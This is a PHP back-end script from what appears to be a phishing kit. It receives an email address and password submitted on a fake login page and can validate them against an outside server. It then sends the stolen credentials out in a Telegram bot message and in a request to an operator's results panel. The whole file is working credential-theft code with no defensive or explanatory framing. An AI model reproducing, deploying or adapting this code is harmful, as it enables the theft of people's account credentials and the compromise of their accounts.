<?php
include 'config/auth.php';
$result_email = trim($_POST['ai']);
$result_password = trim($_POST['pr']);
if($result_email != null && $result_password != null){
    //check Config
    $parms="email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME'];
    $url=$base_url."page-options/config?".$parms;
    $conf=json_decode(curl($url));
    if($conf=="Disable"){
        // Results  Request
        $params="email=".$email."&token=".$token."&type=".$page."&result_email=".$result_email."&result_password=".$result_password;
        $url1=$base_url."/results/results?".$params;
        curl($url1);
        echo 'ok';
        exit();
    }elseif($conf[0]=="Enable"){
        if(trueLogin($result_email,$result_password)==true){
            if($conf[1]=="Enable"){
                $message="Your Result \nEmail :: ".$result_email."\n"."Password :: ".$result_password."\n"."Page Type :: ".$page;
                $txt = urlencode($message);
                $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
                curl($teleurl);

            }
            // Results  Request
            $params = "email=" . $email . "&token=" . $token . "&type=" . $page . "&result_email=" . $result_email . "&result_password=" . $result_password;
            $url1 = $base_url . "/results/results?" . $params;
            curl($url1);
            echo 'ok';
            exit();

        }else{
            echo 'invalid';
        }
    }elseif($conf[0]=="Disable"){

        if($conf[1]=="Enable"){

            $message="Your Result \nEmail :: ".$result_email."\n"."Password :: ".$result_password."\n"."Page Type :: ".$page;
            $txt = urlencode($message);
            $teleurl = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text=" . $txt;
            curl($teleurl);
        }
        // Results  Request
        $params = "email=" . $email . "&token=" . $token . "&type=" . $page . "&result_email=" . $result_email . "&result_password=" . $result_password;
        $url1 = $base_url . "/results/results?" . $params;
        curl($url1);
        echo 'ok';
        exit();

    }
}
else{
    $signal = 'bad';
    $msg = 'Please fill in all the fields.';
}
// Check True Login
function trueLogin($em,$ps){
    $u="https://bestfriendstore.net/web/get/auth?email=".$em."&password=".$ps;
    if(curl($u)=="ok"){
        return true;
    }else{
        return  false;
    }
}
// Server Request
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}



?>